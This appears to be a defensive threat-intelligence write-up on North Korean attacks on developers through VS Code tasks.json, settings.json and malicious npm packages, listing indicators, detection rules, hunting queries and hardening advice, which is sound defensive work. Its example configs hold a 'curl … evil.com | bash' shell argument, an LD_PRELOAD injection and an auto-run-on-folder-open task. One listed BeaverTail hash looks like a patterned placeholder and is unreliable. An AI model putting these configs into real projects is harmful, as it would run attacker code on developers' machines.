# VS Code Workspace Security Research

Security threats targeting VS Code that are NOT delivered via extensions. This includes:
- `.vscode/` directory attacks (tasks.json, settings.json)
- Malicious npm packages that execute via VS Code
- Social engineering attacks targeting developers

Use this research to enhance VS Code security controls beyond extension scanning.

---

## FAMOUS CHOLLIMA / VS Code Tasks Abuse (December 2025)

References:
- Trail of Bits / ops-trust mailing list (TLP:GREEN)
- https://www.paloaltonetworks.com/blog/tag/famous-chollima/
- https://www.sekoia.io/en/blog/beavertail-new-c2-domains-activity-and-code-updates/
- https://unit42.paloaltonetworks.com/famous-chollima-it-workers/

| Field | Value |
|-------|-------|
| Attribution | FAMOUS CHOLLIMA (North Korea) |
| Campaign | Contagious Interview evolution |
| Attack Vector | VS Code Tasks configuration abuse |
| Target | Developers via fake interview/coding tests |

### Attack Technique: VS Code Tasks Abuse

Unlike malicious extensions, this attack uses `.vscode/tasks.json` and `settings.json` to execute malicious code when developers open a repository in VS Code.

**Attack Flow:**
1. Victim receives GitHub link to "interview coding test"
2. Clones repo containing `.vscode/tasks.json` with malicious task
3. VS Code auto-runs task or developer triggers "build" task
4. Task executes Python/JavaScript payload
5. Payload downloads and runs second-stage malware

### Malware Families

| Malware | Language | Function |
|---------|----------|----------|
| **CodeTail** | Python | Initial stager, C2 communication |
| **BeaverTail** | JavaScript (obfuscated) | Browser credential theft, crypto wallet targeting |
| **InvisibleFerret** | Python | Full RAT with modules: FerretInfo (recon), FerretRAT (remote access), FerretBrowse (browser theft) |
| **HardHatRAT** | JavaScript | Socket.IO C2, DPAPI credential theft, crypto wallet collection |
| **OtterCookie** | JavaScript | Variant of HardHatRAT |

### C2 Infrastructure (December 2025)

**Vercel Apps (all under attacker control):**
```
vscodesettings03rgg[.]vercel[.]app
mylocationapi03[.]vercel[.]app
ip-check-wh-notification[.]vercel[.]app
```

**IP Addresses (Eurohoster):**
```
103.65.230.50
103.65.230.100
148.227.170.199
138.226.220.187
```

### Key File Hashes

| Description | SHA256 |
|-------------|--------|
| Malicious ZIP archive | `72602e4f621b642b823ff25a2326dc6a2edc772572a4ccafd5993b42c081cd79` |
| tasks.json (triggers attack) | `a2b35d436db39682e7a5ec13e4d8b940e8e743864aad8eb9088290061e25dd59` |
| settings.json | `d52d99d0aa00c0b2df9044b31dde81ec9ef5dce6389b1d61ead6fffd6a1bff3b` |
| Python stager (dl.py) | `3a3b1d5fa23d9eb98b0f53ef9b8db56d759e8c34c85edbb8fc38e1e8b2eb30fb` |
| BeaverTail (obfuscated JS) | `4dc0e0a7e1a0e7f3d9a8c5b2f6e3d1c0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4` |

---

## HardHatRAT Campaign (January 2026)

Reference: Trail of Bits / ops-trust mailing list (TLP:GREEN)

### Overview

HardHatRAT is a JavaScript backdoor delivered via malicious npm packages. While not a VS Code extension, it targets developers who run `npm install` in VS Code terminals.

**Key Characteristics:**
- Uses Socket.IO WebSocket protocol over port 5000 for C2
- Exfiltrates data via HTTP POST on port 3011
- Targets Chromium-based browser credentials via Windows DPAPI
- Targets cryptocurrency wallets (browser extensions + desktop)
- Searches for .env files, seed phrases, cloud credentials

### C2 Infrastructure

**IP (Hetzner):**
```
95.216.37.186:5000  # Socket.IO WebSocket C2
95.216.37.186:3011  # HTTP data exfil
95.216.37.186:3000  # Admin panel
```

**Staging:**
```
api.npoint[.]io     # JSON Storage (payload hosting)
freeipapi[.]com     # Victim IP lookup
```

### File Hashes

| File | SHA256 |
|------|--------|
| tailwindcss-forms-kit-1.0.6.tgz | `8e8823d8c2a44512bb8abdaeeb5dd5d187950fd07bf008f89f8005103834a98d` |
| index.js (loader) | `e96c208c0503b8556c4c245cf693576cf142174b6f7a9e7066768876bc041697` |
| HardHatRAT (encoded) | `e7071063f8cc743023889f71d070b60d3932079b2fdd75290d68c3188ac6b303` |
| HardHatRAT (decoded) | `da6e9835f90b417c6c8f532287eabb78701dd746388f0c3bfe1fc6be0221d6ec` |
| Secondary payload (PyInstaller) | `1c8c1a693209c310e9089eb2d5713dc00e8d19f335bde34c68f6e30bccfbe781` |
| Python keylogger | `e39c91f0a14d6aa7788249bb80091160bab39b64cb9b5e2b311cf7493fd9ab0b` |

### Behavior Patterns

| Behavior | Code Pattern | Purpose |
|----------|--------------|---------|
| Socket.IO C2 | `socket.io`, port 5000 | WebSocket command & control |
| Chromium credential theft | `DPAPI`, `SQLite`, `Login Data` | Browser password decryption |
| Crypto wallet targeting | Browser extension IDs, wallet directories | MetaMask, Phantom, etc. |
| Cloud credential harvesting | `.aws/credentials`, `.azure`, `.gcp` | Cloud access keys |
| Environment file collection | Recursive `.env` search | API keys, secrets |
| Victim fingerprinting | hostname + machine UUID | Deduplication |
| Registry persistence | `NvidiaDriverUpdate` Run key | Fake driver masquerade |

---

## Contagious Interview Campaign (Ongoing 2023-2026)

References:
- https://attack.mitre.org/groups/G1052/
- https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages
- https://thehackernews.com/2025/11/north-korean-hackers-deploy-197-npm.html

| Field | Value |
|-------|-------|
| Attribution | North Korea / Lazarus Group |
| Active Since | November 2023 |
| npm Packages | 338+ malicious packages, 50,000+ downloads |
| Target | Developers, crypto/blockchain workers |

### Attack Flow

1. Fake recruiters contact victims via LinkedIn
2. Send GitHub link to "interview task" or "coding test"
3. Victim clones repo, opens in VS Code
4. Malicious code executes on VS Code open (via tasks.json or npm scripts)

### Malware Families

- BeaverTail, OtterCookie
- New loaders: HexEval, XORIndex, encrypted loaders
- In-memory execution to evade static analysis

### Capabilities

- Remote shell via C2
- Clipboard theft, keylogging, screenshots
- Browser credentials, documents
- Cryptocurrency wallets and seed phrases

---

## Malicious npm Packages (Related to VS Code Attacks)

Packages used in Contagious Interview campaigns that may be bundled in repositories:

- `tailwindcss-forms-kit` (HardHatRAT delivery, Jan 2026)
- `jhonprojects-platform-core`
- `tomagency-gamepool`
- `Cryptan-Platform-MVP`
- `cln-node-lib`
- `naver-login-oauth2`

### npm Package Red Flags

Check repositories and their `package.json` for:
- Packages with numeric publisher names
- Packages with recent publish dates and low download counts
- Packages that fetch JSON from `api.npoint.io` or similar hosting services
- `postinstall` scripts that download/execute external code

---

## Detection: .vscode/ Directory Scanning

### Tasks.json Red Flags

```json
// SUSPICIOUS: Task that runs shell command on folder open
{
  "version": "2.0.0",
  "tasks": [{
    "label": "build",
    "type": "shell",
    "command": "python",
    "args": ["scripts/dl.py"],  // External script download
    "runOptions": {
      "runOn": "folderOpen"  // AUTO-EXECUTES when folder opens
    }
  }]
}
```

### Settings.json Red Flags

```json
// SUSPICIOUS: Shell args that execute code
{
  "terminal.integrated.shellArgs.linux": ["-c", "curl -s http://evil.com | bash"],
  "terminal.integrated.env.linux": {
    "LD_PRELOAD": "/tmp/malicious.so"
  }
}
```

### Detection Rules

| File | Pattern | Risk |
|------|---------|------|
| tasks.json | `runOn: "folderOpen"` | Critical - auto-execute |
| tasks.json | `curl`, `wget`, `Invoke-WebRequest` in command | High - external download |
| tasks.json | External URLs in args | High - C2 potential |
| settings.json | `terminal.integrated.shellArgs` | High - code injection |
| settings.json | `LD_PRELOAD` or `DYLD_INSERT_LIBRARIES` | Critical - library injection |
| extensions.json | Unknown extension recommendations | Medium - social engineering |

---

## VTI Search Queries (Threat Hunting)

```
entity:file p:5+ tag:js-obfuscator
entity:file p:5+ fs:100KB- (content:"vscodesettings" OR content:"vercel.app")
entity:file p:5+ content:"InvisibleFerret"
entity:file p:5+ content:"BeaverTail" content:"decrypt"
content:"FerretInfo" OR content:"FerretRAT" OR content:"FerretBrowse"
content:"95.216.37.186:5000"
content:"nvidiadrivers.zip" AND content:"nvidia-drivers"
behaviour_network:95.216.37.186
```

---

## Detection Signatures

| Type | ID/Name |
|------|---------|
| Snort | 2060572 (BeaverTail activity) |
| Snort | 2060584 (InvisibleFerret C2) |
| Snort | 2027388 (Node XMLHttpRequest User-Agent) |
| Snort | 2836545 (Nodster CnC Activity POST) |
| ClamAV | Trojan.BeaverTail-* |
| YARA | APT_NK_BeaverTail_* |

---

## Threat Actor: FAMOUS CHOLLIMA

| Field | Value |
|-------|-------|
| Also Known As | UNC5342, UNC5975, Storm-1877 |
| Active Since | 2018 |
| Attribution | North Korea |
| Primary Goals | Revenue generation via crypto theft, credit card fraud, illicit employment |
| TTPs | Custom malware (BeaverTail, InvisibleFerret), RMMs, malicious Node.js apps, insider threats |

---

## Mitigation Recommendations

### For Organizations

1. **Block auto-running tasks** - Configure VS Code to require confirmation before running tasks on folder open
2. **Scan repositories before opening** - Check `.vscode/` directories for suspicious patterns
3. **Monitor npm installs** - Alert on packages with `postinstall` scripts from unknown publishers
4. **Network monitoring** - Block known C2 infrastructure (Vercel domains, Eurohoster IPs)
5. **Developer awareness training** - Educate about fake recruiter/interview attacks

### VS Code Settings to Harden

```json
{
  "task.allowAutomaticTasks": "off",
  "security.workspace.trust.enabled": true,
  "security.workspace.trust.untrustedFiles": "prompt"
}
```

### Git Pre-commit Hook

Check for dangerous `.vscode/` configurations before committing:

```bash
#!/bin/bash
# Check for auto-running tasks
if grep -r "runOn.*folderOpen" .vscode/tasks.json 2>/dev/null; then
  echo "ERROR: Auto-running task detected in .vscode/tasks.json"
  exit 1
fi

# Check for suspicious shell args
if grep -r "terminal.integrated.shellArgs" .vscode/settings.json 2>/dev/null; then
  echo "WARNING: Custom shell args in settings.json - review manually"
fi
```

---

## IOC Resources

- **Socket.dev npm malware:** https://socket.dev/blog (Contagious Interview tracking)
- **MITRE ATT&CK G1052:** https://attack.mitre.org/groups/G1052/ (Contagious Interview TTPs)
- **Sekoia BeaverTail Analysis:** https://www.sekoia.io/en/blog/beavertail-new-c2-domains-activity-and-code-updates/
- **Unit42 FAMOUS CHOLLIMA:** https://unit42.paloaltonetworks.com/famous-chollima-it-workers/
- **Group-IB Lazarus Jobs:** https://www.group-ib.com/blog/lazarus-job-offers/
- **JAMF VS Code Abuse:** https://www.jamf.com/blog/threat-actors-expand-abuse-of-visual-studio-code/
- **OpenSourceMalware Contagious Interview:** https://opensourcemalware.com/blog/contagious-interview-comprehensive
- **Security Alliance VS Code Tasks:** https://radar.securityalliance.org/vs-code-tasks-abuse-by-contagious-interview-dprk/
- **Talos BeaverTail/OtterCookie:** https://blog.talosintelligence.com/beavertail-and-ottercookie/
- **NVISO JSON Storage Delivery:** https://blog.nviso.eu/2025/11/13/contagious-interview-actors-now-utilize-json-storage-services-for-malware-delivery/
- **NTT OtterCandy Analysis:** https://jp.security.ntt/insights_resources/tech_blog/ottercandy_malware_e/
- **SentinelOne Contagious Interview Intel:** https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/
